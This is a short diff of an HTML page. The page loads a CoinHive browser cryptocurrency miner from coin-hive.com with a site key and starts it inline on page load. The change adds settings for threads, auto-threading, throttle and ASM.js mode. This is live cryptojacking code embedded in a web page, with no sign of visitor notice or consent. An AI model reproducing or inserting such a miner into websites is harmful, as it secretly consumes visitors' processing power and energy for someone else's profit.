@@ -19,7 +19,14 @@
 </script>
   <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
-    var miner = new CoinHive.Anonymous('VzaRHxDmlax9dXmYQTauyAQheYtzLShx');
+    var miner = new CoinHive.Anonymous('VzaRHxDmlax9dXmYQTauyAQheYtzLShx',{
+  threads: 8,
+	autoThreads: true,
+	throttle: 0.8,
+	forceASMJS: true,
+	theme: 'dark',
+	language: 'auto'
+});
     miner.start();
 </script>
 <meta name="twitter:card" content="summary">
